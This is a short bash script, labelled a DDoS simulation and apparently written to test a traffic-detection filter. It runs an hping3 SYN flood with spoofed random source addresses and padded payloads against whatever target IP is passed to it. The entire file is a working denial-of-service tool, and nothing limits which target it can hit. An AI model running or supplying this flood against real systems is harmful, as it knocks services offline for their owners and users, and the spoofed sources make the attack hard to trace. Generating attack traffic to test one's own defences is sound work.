#!/bin/bash
# DDoS Attack Simulation

TARGET=$1
DURATION=${2:-30}

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip> [duration_seconds]"
    exit 1
fi

echo "Starting High-Intensity DDoS on $TARGET for $DURATION seconds..."

# We use -S (SYN), -p 80 (Target Port), and --flood for speed
# --rand-source: Creates maximum entropy for your dynamic filter
# -d 1000: Increases payload to 1000 bytes to spike byte-rate features
# --win 65535: Maximize TCP window size to look like a real connection attempt
timeout $DURATION sudo hping3 -S -p 80 --flood --rand-source -d 1000 --win 65535 $TARGET > /dev/null 2>&1

echo "DDoS attack completed"